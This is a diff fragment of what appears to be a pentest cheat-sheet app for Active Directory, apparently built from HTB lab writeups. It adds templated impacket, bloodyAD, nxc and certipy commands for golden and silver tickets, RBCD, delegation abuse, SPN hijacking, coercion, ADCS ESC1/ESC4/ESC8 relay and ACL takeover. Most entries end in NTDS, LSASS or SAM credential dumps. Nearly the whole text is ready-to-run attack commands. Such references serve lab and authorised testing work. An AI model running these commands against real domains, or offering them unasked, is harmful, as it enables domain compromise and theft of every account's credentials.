+ [`impacket-getTGT '{{domain}}/{{user}}' -hashes ':{{nthash}}' -dc-ip {{dc_ip}}`,'NT hash (overpass-the-hash)'],
+ [`impacket-getTGT '{{domain}}/{{user}}' -aesKey '{{aeskey}}' -dc-ip {{dc_ip}}`,'AES256 key'],
+ [`export KRB5CCNAME={{user}}.ccache && klist`,'use ticket'],
+ [`nxc smb {{target_host}} -u '{{user}}' -k --use-kcache`,'test ticket']
+],note:'getTGT saves <span class="mono">&lt;user&gt;.ccache</span> in the current directory. For machine accounts use the trailing <span class="mono">$</span>: <span class="mono">\'{{domain}}/PC01$\'</span>.'});
+
+R({id:'getst',cat:'krb',title:'getST — service ticket, impersonation & altservice',desc:'Request a service ticket as an arbitrary user (S4U2Self/S4U2Proxy). The workhorse for delegation attacks.',
+cmds:[
+ [`impacket-getST '{{domain}}/{{user}}:{{password}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'with password'],
+ [`impacket-getST '{{domain}}/{{user}}' -hashes ':{{nthash}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'with NT hash'],
+ [`impacket-getST '{{domain}}/{{user}}$' -aesKey '{{aeskey}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'machine account + AES key'],
+ [`impacket-getST '{{domain}}/{{user}}$' -k -no-pass -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'via ccache (KRB5CCNAME)'],
+ [`impacket-getST '{{domain}}/{{user}}:{{password}}' -spn '{{spn}}' -impersonate '{{target_user}}' -altservice 'HOST/{{target_fqdn}}' -dc-ip {{dc_ip}}`,'altservice trick'],
+ [`export KRB5CCNAME=$(pwd)/'{{target_user}}@{{spn}}@{{realm}}.ccache' && klist`,'use returned ticket']
+],note:'<b>altservice</b>: if the target has no SPN for the service you need, request one it does have (usually <span class="mono">HOST/target</span>) and rewrite the service class in the ticket — your notes used this for <span class="mono">MSSQLSvc/PROD-SQL</span> → <span class="mono">HOST/PROD-DC</span>. Always <span class="mono">ls *.ccache</span> — newer impacket names the file with the full SPN (slashes become underscores).'});
+
+R({id:'ccache-usage',cat:'krb',title:'Working with ccache files',desc:'Naming, env var, conversion and validation.',
+cmds:[
+ [`export KRB5CCNAME=$(pwd)/{{ccache}}`,'set ticket for all tools'],
+ [`klist`,'show principals + expiry','n'],
+ [`impacket-ticketConverter ticket.kirbi ticket.ccache`,'kirbi → ccache (Windows→Kali)','n'],
+ [`nxc smb {{target_host}} -u '{{user}}' -k --use-kcache --sam --lsa`,'use ccache for dumping'],
+ [`impacket-secretsdump -k -no-pass {{target_fqdn}} -just-dc`,'secretsdump with ccache']
+],note:'Kerberos needs name resolution — add <span class="mono">{{dc_ip}} {{domain}} {{dc_fqdn}}</span> to <span class="mono">/etc/hosts</span> or use <span class="mono">--dns-server {{dc_ip}}</span> where supported.'});
+
+R({id:'golden-ticket',cat:'krb',title:'Golden ticket (krbtgt)',desc:'Full domain persistence: forge a TGT with the krbtgt hash.',
+cmds:[
+ [`impacket-secretsdump -just-dc-user krbtgt '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -dc-ip {{dc_ip}}`,'extract krbtgt hash'],
+ [`impacket-secretsdump -k -no-pass -just-dc-user krbtgt '{{domain}}/{{user}}@{{dc_fqdn}}'`,'extract krbtgt via ccache'],
+ [`impacket-ticketer -nthash '{{krbtgt_hash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} '{{target_user}}'`,'forge golden (NT hash)'],
+ [`impacket-ticketer -aesKey '{{aeskey}}' -domain-sid '{{domain_sid}}' -domain {{domain}} '{{target_user}}'`,'forge golden (AES256)'],
+ [`export KRB5CCNAME=$(pwd)/'{{target_user}}.ccache' && nxc smb {{dc_host}} -u '{{target_user}}' -k --use-kcache --ntds`,'use it to DCSync'],
+ [`impacket-lookupsid '{{domain}}/{{target_user}}'@{{dc_host}} -k -no-pass`,'verify ticket works']
+],note:'Golden tickets survive password changes of the impersonated user — only a double krbtgt reset kills them (lab: single reset fine). Domain SID: see context, e.g. <span class="mono">S-1-5-21-…</span>.'});
+
+R({id:'silver-ticket',cat:'krb',title:'Silver ticket (service hash)',desc:'Forge a TGS for one service when you have that machine/service account hash.',
+cmds:[
+ [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{target_host}}' -just-dc-user '{{target_host}}$'`,'get machine account hash'],
+ [`impacket-ticketer -nthash '{{nthash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -spn cifs/{{target_fqdn}} '{{target_user}}'`,'forge silver TGS'],
+ [`export KRB5CCNAME=$(pwd)/'{{target_user}}.ccache' && nxc smb {{target_host}} -u '{{target_user}}' -k --use-kcache`,'use it'],
+ [`impacket-ticketer -nthash '{{nthash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -spn HOST/{{target_fqdn}} '{{target_user}}'`,'HOST variant (for psexec)']
+],note:'Silver tickets bypass the DC entirely — no traffic to validate, no golden ticket needed. SPN must match exactly what the service runs as.'});
+
+/* ===== DELEGATION & RBCD ===== */
+R({id:'deleg-enum',cat:'deleg',title:'Enumerate delegation settings',desc:'Find constrained, unconstrained and RBCD configuration before abusing it.',
+cmds:[
+ [`impacket-findDelegation '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'all delegation (impacket)'],
+ [`impacket-findDelegation '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'all delegation via ccache'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --trusted-for-delegation`,'unconstrained candidates'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap constrained`,'constrained (msldap)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap constrained`,'constrained via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap unconstrained`,'unconstrained (msldap)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap s4u2proxy`,'S4U2Proxy actors'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity,msDS-AllowedToDelegateTo,userAccountControl`,'RBCD attr on target']
+],note:'<span class="mono">userAccountControl</span> bit 0x80000 = TRUSTED_FOR_DELEGATION (unconstrained), 0x1000000 = TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition). RBCD is stored in <span class="mono">msDS-AllowedToActOnBehalfOfOtherIdentity</span> on the target.'});
+
+R({id:'rbcd-read',cat:'deleg',title:'RBCD step 1 — read current delegation state',desc:'See who (if anyone) is already allowed to act on behalf of the target computer.',
+cmds:[
+ [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action read '{{domain}}/{{user}}:{{password}}'`,'read RBCD entry'],
+ [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action read '{{domain}}/{{user}}' -hashes ':{{nthash}}'`,'read via PtH'],
+ [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action read '{{domain}}/{{user}}' -k -no-pass`,'read via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity`,'bloodyAD read'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --trusted-for-delegation`,'spot unconstrained leaders']
+],note:'<span class="mono">Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty</span> = nobody can RBCD yet. You need write access on the target computer object: GenericAll, GenericWrite, WriteDACL, or <span class="mono">WriteAccountRestrictions</span>.'});
+
+R({id:'rbcd-addcomputer',cat:'deleg',title:'RBCD step 2 — add a rogue machine account',desc:'You need a computer account you control (its SID will be the delegate). Default quota (MachineAccountQuota ≥ 1) usually allows this for any user.',
+cmds:[
+ [`impacket-addcomputer -method SAMR -computer-name '{{computer_name}}' -computer-pass '{{computer_pass}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'SAMR (default, no encryption)'],
+ [`impacket-addcomputer -method LDAPS -computer-name '{{computer_name}}' -computer-pass '{{computer_pass}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'LDAPS (needs cert/PKINIT)'],
+ [`impacket-addcomputer -method SAMR -computer-name '{{computer_name}}' -computer-pass '{{computer_pass}}' -k -no-pass '{{domain}}/{{user}}' -dc-ip {{dc_ip}}`,'SAMR via ccache'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M maq`,'check MachineAccountQuota'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add computer '{{computer_name}}' '{{computer_pass}}'`,'bloodyAD alternative (no $ in name)']
+],note:'Successful output: <span class="mono">[*] Successfully added machine account {{computer_name}} with password {{computer_pass}}.</span> If MAQ is 0 and you lack rights: relay NTLM to LDAP and use <span class="mono">ntlmrelayx --delegate-access</span> instead. Cleanup at the end: <span class="mono">impacket-addcomputer ... -delete</span> or bloodyAD <span class="mono">remove computer</span>.'});
+
+R({id:'rbcd-write',cat:'deleg',title:'RBCD step 3 — grant delegation from rogue machine',desc:'Point the target computer at your rogue machine account.',
+cmds:[
+ [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action write '{{domain}}/{{user}}:{{password}}' -delegate-from '{{computer_name}}'`,'impacket write'],
+ [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action write '{{domain}}/{{user}}' -hashes ':{{nthash}}' -delegate-from '{{computer_name}}'`,'write via PtH'],
+ [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action write '{{domain}}/{{user}}' -k -no-pass -delegate-from '{{computer_name}}'`,'write via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'bloodyAD one-liner'],
+ [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action read '{{domain}}/{{user}}:{{password}}'`,'verify'],
+ [`impacket-rbcd -delegate-to '{{target_host}}$' -dc-ip {{dc_ip}} -action flush '{{domain}}/{{user}}:{{password}}'`,'CLEANUP: flush all']
+],note:'Expected output: <span class="mono">[+] {{computer_name}} can now impersonate users on {{target_host}}$ via S4U2Proxy</span>. If the DC is unpatched you may need to map the DC\'s own computer account instead of a new one — but the rogue-computer route is the standard.'});
+
+R({id:'rbcd-getst',cat:'deleg',title:'RBCD step 4 — get a ticket as Administrator',desc:'Use the rogue machine account to obtain a service ticket impersonating a privileged user.',
+cmds:[
+ [`impacket-getST -spn cifs/{{target_fqdn}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/{{computer_name}}:{{computer_pass}}'`,'S4U2Proxy via rogue machine'],
+ [`impacket-getST -spn cifs/{{target_host}}$.{{domain}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/{{computer_name}}:{{computer_pass}}'`,'SPN with $-form (writeup style)'],
+ [`impacket-getST -spn HOST/{{target_fqdn}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/{{computer_name}}:{{computer_pass}}' -altservice 'cifs/{{target_fqdn}}'`,'altservice variant (your notes)'],
+ [`impacket-getST -spn cifs/{{target_fqdn}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/{{computer_name}}' -hashes ':{{nthash}}'`,'machine via PtH'],
+ [`impacket-getST -spn cifs/{{target_fqdn}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/{{computer_name}}' -k -no-pass`,'via machine ccache']
+],note:'Your notes used the altservice trick: request <span class="mono">MSSQLSvc/PROD-SQL</span> but rewrite to <span class="mono">HOST/PROD-DC.argon.htb</span> so the ticket is accepted by the DC service. If you get <span class="mono">KDC_ERR_S_PRINCIPAL_UNKNOWN</span>, pick an SPN the target actually has (HOST is almost always present).'});
+
+R({id:'rbcd-use',cat:'deleg',title:'RBCD step 5 + 6 — use the ticket and dump',desc:'Export the ccache, confirm the identity, then dump SAM/LSA/NTDS or execute commands.',
+cmds:[
+ [`ls -la *.ccache`,'find the ticket file'],
+ [`export KRB5CCNAME=$(pwd)/'{{target_user}}@cifs_{{target_fqdn}}@{{realm}}.ccache'`,'export (adjust name)'],
+ [`klist`,'verify principal + service'],
+ [`nxc smb {{target_host}} -u '{{target_user}}' -k --use-kcache`,'whoami check'],
+ [`nxc smb {{target_host}} -u '{{target_user}}' -k --use-kcache --sam --lsa --dpapi`,'dump SAM/LSA/DPAPI'],
+ [`nxc smb {{target_host}} -u '{{target_user}}' -k --use-kcache --ntds`,'dump NTDS if DC'],
+ [`impacket-secretsdump -k -no-pass -target-ip {{target_ip}} '{{target_fqdn}}'`,'impacket secretsdump via ccache']
+],note:'On a DC this is game over: <span class="mono">--ntds</span> gives every hash incl. krbtgt. In your writeup the final step was <span class="mono">secretsdump -k -target-ip 1.2.3.4 FRPSCCM02</span> with the Administrator ccache. If nxc hangs, use <span class="mono">--dns-server {{dc_ip}}</span>.'});
+
+R({id:'rbcd-bloodyad',cat:'deleg',title:'RBCD — full bloodyAD variant',desc:'Same attack without impacket, using LDAP directly (useful when SAMR is blocked).',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add computer '{{computer_name}}' '{{computer_pass}}'`,'add rogue computer'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'grant RBCD'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add rbcd '{{target_host}}$' '{{computer_name}}'`,'grant RBCD via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity`,'verify attribute'],
+ [`impacket-getST -spn cifs/{{target_fqdn}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/{{computer_name}}:{{computer_pass}}'`,'ticket'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove rbcd '{{target_host}}$' '{{computer_name}}'`,'CLEANUP: remove RBCD'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove computer '{{computer_name}}'`,'CLEANUP: delete computer']
+],note:'bloodyAD can also dump the ticket it just obtained — <span class="mono">add shadowCredentials</span> works the same LDAP-first way. Useful behind SOCKS without direct SAMR.'});
+
+R({id:'constrained-getst',cat:'deleg',title:'Constrained delegation abuse (S4U2Proxy)',desc:'An account allowed to delegate to a service can impersonate any user to that service — including Domain Admins.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{user}}$' --attr msDS-AllowedToDelegateTo,userAccountControl`,'check delegation + T2A4D flag (0x1000000)'],
+ [`impacket-findDelegation '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'find msDS-AllowedToDelegateTo'],
+ [`impacket-getST '{{domain}}/{{user}}:{{password}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'impersonate with password'],
+ [`impacket-getST '{{domain}}/{{user}}' -hashes ':{{nthash}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'impersonate with hash'],
+ [`impacket-getST '{{domain}}/{{user}}$' -aesKey '{{aeskey}}' -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'machine service with AES key (keytab path)'],
+ [`impacket-getST '{{domain}}/{{user}}$' -k -no-pass -spn '{{spn}}' -impersonate '{{target_user}}' -dc-ip {{dc_ip}}`,'ccache of the delegating account'],
+ [`impacket-getST '{{domain}}/{{user}}:{{password}}' -spn 'cifs/{{target_fqdn}}' -impersonate '{{target_user}}' -altservice 'HOST/{{target_fqdn}}' -dc-ip {{dc_ip}}`,'altservice for local admin services'],
+ [`impacket-getST '{{domain}}/{{user}}$' -aesKey '{{aeskey}}' -spn '{{spn}}' -impersonate '{{target_user}}' -altservice 'HOST/{{dc_fqdn}}' -dc-ip {{dc_ip}}`,'after SPN redirect: ticket for the DC'],
+ [`nxc smb {{target_host}} -u '{{target_user}}' -k --use-kcache`,'use the ticket']
+],note:'<b>T2A4D</b> (TRUSTED_TO_AUTH_FOR_DELEGATION, 0x1000000) is required for <span class="mono">-impersonate</span> without a pre-existing forwardable user ticket — without it you get <span class="mono">KDC_ERR_BADOPTION</span>. If the delegated SPN resolves to nothing (<span class="mono">KDC_ERR_S_PRINCIPAL_UNKNOWN</span>), use the <b>SPN hijack</b> recipe: move the SPN onto the DC and request with <span class="mono">-altservice HOST/{{dc_fqdn}}</span>.'});
+
+R({id:'spn-hijack-deleg',cat:'deleg',title:'SPN hijack — redirect constrained delegation to the DC',desc:'Constrained delegation points at a service that does not exist (or is out of reach)? Move its SPN onto the DC — the KDC then issues your S4U2Proxy ticket for the DC machine account.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{user}}$' --attr msDS-AllowedToDelegateTo,userAccountControl`,'confirm delegation + T2A4D (0x1000000)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get search --filter '(servicePrincipalName={{spn}})' --attr sAMAccountName,distinguishedName`,'which object holds the target SPN?'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{dc_host}}$' --attr distinguishedName`,'get the DC object DN → dc_dn'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap delspn "{{dn}}" "{{spn}}"`,'remove SPN from old owner (your notes)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dc_dn}}" "{{spn}}"`,'add SPN to the DC account (your notes)'],
+ [`impacket-getST '{{domain}}/{{user}}$' -aesKey '{{aeskey}}' -spn '{{spn}}' -impersonate '{{target_user}}' -altservice 'HOST/{{dc_fqdn}}' -dc-ip {{dc_ip}}`,'your original getST — ticket now encrypted for the DC'],
+ [`impacket-getST '{{domain}}/{{user}}$' -k -no-pass -spn '{{spn}}' -impersonate '{{target_user}}' -altservice 'HOST/{{dc_fqdn}}' -dc-ip {{dc_ip}}`,'ccache variant of your original getST'],
+ [`ls -la *.ccache`,'find ticket file'],
+ [`export KRB5CCNAME=$(pwd)/'{{target_user}}@HOST_{{dc_fqdn}}@{{realm}}.ccache'`,'export (adjust name)'],
+ [`nxc smb {{dc_host}} -u '{{target_user}}' -k --use-kcache --ntds`,'DC takeover: NTDS dump'],
+ [`nxc smb {{dc_host}} -u '{{target_user}}' -k --use-kcache --dpapi --sam --lsa --sccm`,'your writeup dump line'],
+ [`impacket-secretsdump -k -no-pass {{dc_fqdn}} -just-dc`,'impacket variant'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap delspn "{{dc_dn}}" "{{spn}}"`,'CLEANUP: remove SPN from DC'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} msldap addspn "{{dn}}" "{{spn}}"`,'CLEANUP: restore SPN on original owner']
+],note:'Requirements: write access on the DC object\'s <span class="mono">servicePrincipalName</span> (GenericWrite/GenericAll on the DC or DA) plus the delegating account\'s key (keytab/AES or hash) and T2A4D. Never leave the SPN on two objects — duplicate SPNs make the KDC resolve unpredictably; delete first, then add. Changes apply at the next ticket request (multi-DC setups: wait for replication). <span class="mono">-altservice HOST/{{dc_fqdn}}</span> rewrites the service class so SMB/LDAP on the DC accepts the ticket.'});
+
+R({id:'unconstrained-coerce',cat:'deleg',title:'Unconstrained delegation + coercion',desc:'A machine trusted for delegation caches TGTs of users who authenticate to it. Coerce a DC and collect them.',
+cmds:[
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --trusted-for-delegation`,'find unconstrained hosts'],
+ [`impacket-printerbug '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{dc_ip}}`,'coerce DC via print spooler'],
+ [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{dc_ip}}`,'coerce via EFSRPC'],
+ [`coercer -u '{{user}}' -p '{{password}}' -d {{domain}} --target {{target_host}}`,'mass coercion (all vectors)'],
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M lsassy`,'dump cached TGTs from LSASS'],
+ [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'full LSASS dump path'],
+ [`impacket-secretsdump -k -no-pass '{{domain}}/{{user}}@{{target_fqdn}}'`,'LSASS dump via ccache']
+],note:'Classic chain: you have admin on an unconstrained host → coerce <span class="mono">{{dc_host}}</span> to authenticate to that host → DC machine TGT lands in LSASS → dump it → DCSync. Check spooler first: <span class="mono">nxc smb {{target_host}} -M printnightmare</span> / <span class="mono">rpcclient -c \'getprinter\'</span>. On Kali, nxc <span class="mono">-M lsassy</span> or <span class="mono">-M nanodump</span> reads LSASS without Mimikatz.'});
+
+/* ===== ADCS / CERTIPY ===== */
+R({id:'adcs-find',cat:'adcs',title:'ADCS — enumerate CAs and templates',desc:'Certipy 5.x: find vulnerable templates and CA configuration.',
+cmds:[
+ [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -vulnerable -stdout`,'password auth'],
+ [`certipy find -u '{{user}}@{{domain}}' -hashes ':{{nthash}}' -dc-ip {{dc_ip}} -vulnerable -stdout`,'via NT hash'],
+ [`certipy find -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -vulnerable -stdout`,'via ccache'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' -M adcs`,'nxc module'],
+ [`certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -bloodhound`,'export for BloodHound']
+],note:'Look for <b>ESC1/ESC8</b> first. Template flagged <span class="mono">[!] Vulnerabilities</span> with <span class="mono">Enrollee Supplies Subject: True</span> + Client Auth = ESC1. CA with <span class="mono">Web Enrollment</span> / HTTP endpoints = ESC8 (relay).'});
+
+R({id:'adcs-esc1',cat:'adcs',title:'ADCS — ESC1 (impersonate via UPN)',desc:'Request a certificate as any user because the template allows a supplied SAN and client auth.',
+cmds:[
+ [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}'`,'request cert as target user'],
+ [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}' -target '{{ca_host}}'`,'if CA host unresolved'],
+ [`certipy req -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}'`,'request via ccache'],
+ [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'PKINIT → NT hash'],
+ [`nxc smb {{dc_host}} -u '{{target_user}}' -H '<hash from certipy auth>' --ntds`,'DCSync with the obtained hash (DC only)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{template}}' --attr msPKI-Certificate-Name-Flag,pkiExtendedKeyUsage`,'verify template flags yourself']
+],note:'If the CA requires manager approval or the template is not directly enrollable, chain ESC4/ESC7 first. <span class="mono">certipy auth</span> outputs the NT hash of the impersonated account — use it directly with PtH.'});
+
+R({id:'adcs-esc4',cat:'adcs',title:'ADCS — ESC4 (rewrite template, then ESC1)',desc:'You can write on the template object: turn it into an ESC1 machine.',
+cmds:[
+ [`certipy template -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -template '{{template}}' -write-default-configuration -save-old`,'make template ESC1-able (save old config)'],
+ [`certipy template -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -template '{{template}}' -write-default-configuration -save-old`,'template edit via ccache'],
+ [`certipy req -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -ca '{{ca}}' -template '{{template}}' -upn '{{target_user}}@{{domain}}'`,'exploit'],
+ [`certipy auth -pfx '{{target_user}}.pfx' -dc-ip {{dc_ip}}`,'PKINIT → NT hash']
+],note:'Always run with <span class="mono">-save-old</span> first — it stores the original template configuration next to you, so you can restore the permissions manually afterwards (see certipy wiki). Requires WriteProperty/GenericAll on the template.'});
+
+R({id:'adcs-esc8',cat:'adcs',title:'ADCS — ESC8 (relay to HTTP enrollment)',desc:'Relay NTLM (often coerced from a DC) to the CA web enrollment endpoint and get a DC certificate.',
+cmds:[
+ [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M coerce_plus -o LISTENER={{attacker_ip}}`,'coerce auth to attacker'],
+ [`impacket-ntlmrelayx -t http://{{ca_host}}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`,'relay to CA (no proxy)','n'],
+ [`impacket-ntlmrelayx -t http://{{ca_host}}/certsrv/certfnsh.asp -smb2support --adcs --template Machine`,'generic machine template','n'],
+ [`certipy auth -pfx '{{target_host}}.pfx' -dc-ip {{dc_ip}}`,'DC cert → NT hash'],
+ [`nxc smb {{dc_host}} -u '{{target_user}}' -H '<DC hash>' --ntds`,'DCSync']
+],note:'Coercion starts the relay: the DC machine account authenticates to your listener, ntlmrelayx forwards it to the CA and prints a base64 certificate. Decode/save as <span class="mono">{{target_host}}.pfx</span>, then <span class="mono">certipy auth</span>. HTTP (not HTTPS) enrollment is the giveaway in <span class="mono">certipy find</span>.'});
+
+/* ===== ACL / DACL ABUSE ===== */
+R({id:'dacl-enum',cat:'dacl',title:'Enumerate ACLs on an object',desc:'Read the security descriptor and find abusable rights (GenericAll, WriteDACL, WriteOwner, ForceChangePassword, AddSelf).',
+cmds:[
+ [`impacket-dacledit -action read -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'dacledit read (user)'],
+ [`impacket-dacledit -action read -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'dacledit read via ccache'],
+ [`impacket-dacledit -action read -principal '{{user}}' -target '{{target_host}}$' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'dacledit read (computer)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_user}}' --resolve-sd`,'bloodyAD resolve SD'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'all my write rights']
+],note:'BloodHound equivalents: <span class="mono">GenericAll</span>, <span class="mono">GenericWrite</span>, <span class="mono">WriteDacl</span>, <span class="mono">WriteOwner</span>, <span class="mono">ForceChangePassword</span>, <span class="mono">AddSelf</span>, <span class="mono">AddKeyCredentialLink</span> edges.'});
+
+R({id:'dacl-genericall-user',cat:'dacl',title:'GenericAll on user — takeover options',desc:'Full control over a user object. Pick the least destructive path that gets you in.',
+cmds:[
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_user}}'`,'option A: shadow credentials'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add shadowCredentials '{{target_user}}'`,'option A via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap addspn "{{dn}}" "fake/spn"`,'option B: targeted kerberoast (then roast + delspn)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set password '{{target_user}}' 'Pwn3d123!'`,'option C: reset password (loud)'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{target_user}}'`,'option D: add to high-value group'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add genericAll '{{target_user}}' '{{user}}'`,'grant yourself (if you have WriteDacl)']
+],note:'Shadow credentials (addKeyCredentialLink) is usually the cleanest: it yields a TGT + NT hash via PKINIT without touching the password.'});
+
+R({id:'dacl-genericall-computer',cat:'dacl',title:'GenericAll / WriteAccountRestrictions on computer',desc:'Full control over a machine — shadow credentials or RBCD.',
+cmds:[
+ [`certipy shadow auto -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{target_host}}$'`,'shadow credentials on machine'],
+ [`certipy shadow auto -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -account '{{target_host}}$'`,'shadow creds via ccache'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_host}}$'`,'bloodyAD variant'],
+ [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'RBCD (need rogue machine first)'],
